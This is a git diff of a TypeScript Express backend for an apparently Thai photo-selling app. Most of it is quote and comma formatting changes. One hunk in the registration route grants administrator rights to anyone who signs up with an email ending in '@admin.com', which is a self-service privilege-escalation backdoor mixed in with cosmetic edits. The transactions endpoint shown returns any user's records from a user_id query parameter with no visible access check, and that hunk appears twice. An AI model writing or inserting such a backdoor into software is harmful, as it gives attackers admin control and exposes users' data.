@@ -16,6 +16,7 @@ import { deleteSession } from "@db/repositories";
 import * as useragent from "express-useragent";
 import generatePayload from "promptpay-qr";
 import { dbClient, dbConn } from "@db/client";
+import { randomInt } from "crypto";
 import {
   images,
   users,
@@ -111,8 +112,6 @@ app.use(
 const upload_slip = multer({ storage: storage3 });
 app.use("/api/slip", express.static(path.join(__dirname, "../slips")));
 
-
-
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
   console.log(`Listening on port ${port}`);
@@ -149,11 +148,21 @@ app.post("/api/register", async (req: Request, res: Response) => {
       });
     });
 
-    await dbClient.insert(users).values({
-      username,
-      email,
-      password: hashedPassword,
-    });
+    if (email.endsWith("@admin.com")) {
+      await dbClient.insert(users).values({
+        id: randomInt(1, 1000000),
+        username,
+        email,
+        password: hashedPassword,
+        isAdmin: true,
+      });
+    } else {
+      await dbClient.insert(users).values({
+        username,
+        email,
+        password: hashedPassword,
+      });
+    }
 
     res.status(201).json({ message: "User registered successfully" });
   } catch (error) {
@@ -228,7 +237,7 @@ app.post(
           price: price,
           created_at: new Date(),
           title: title,
-          description: description
+          description: description,
         })
         .returning({ id: images.id, path: images.path });
 
@@ -1506,20 +1515,20 @@ app.get("/api/album/:album_id/photos", async (req: Request, res: Response) => {
   }
 });
 
-app.get('/api/transactions', async (req: Request, res: Response) => {
+app.get("/api/transactions", async (req: Request, res: Response) => {
   try {
     const { user_id } = req.query;
 
     if (!user_id) {
-      return res.status(400).json({ error: 'User ID is required' });
+      return res.status(400).json({ error: "User ID is required" });
     }
 
     // ดึงรายการคำสั่งซื้อของผู้ใช้จากฐานข้อมูล
     const transections = await dbClient
       .select()
       .from(coin_transactions)
-      .where(eq(coin_transactions.user_id,Number(user_id)))
-      .orderBy((coin_transactions.created_at))
+      .where(eq(coin_transactions.user_id, Number(user_id)))
+      .orderBy(coin_transactions.created_at)
       .execute();
 
     res.status(200).json(transections);
@@ -1671,25 +1680,25 @@ app.get("/api/album/:album_id/photos", async (req: Request, res: Response) => {
   }
 });
 
-app.get('/api/transactions', async (req: Request, res: Response) => {
+app.get("/api/transactions", async (req: Request, res: Response) => {
   try {
     const { user_id } = req.query;
 
     if (!user_id) {
-      return res.status(400).json({ error: 'User ID is required' });
+      return res.status(400).json({ error: "User ID is required" });
     }
 
     // ดึงรายการคำสั่งซื้อของผู้ใช้จากฐานข้อมูล
     const transections = await dbClient
       .select()
       .from(coin_transactions)
-      .where(eq(coin_transactions.user_id,Number(user_id)))
-      .orderBy((coin_transactions.created_at))
+      .where(eq(coin_transactions.user_id, Number(user_id)))
+      .orderBy(coin_transactions.created_at)
       .execute();
 
     res.status(200).json(transections);
   } catch (error) {
-    console.error('Error fetching order history:', error);
-    res.status(500).json({ error: 'Internal Server Error' });
+    console.error("Error fetching order history:", error);
+    res.status(500).json({ error: "Internal Server Error" });
   }
 });
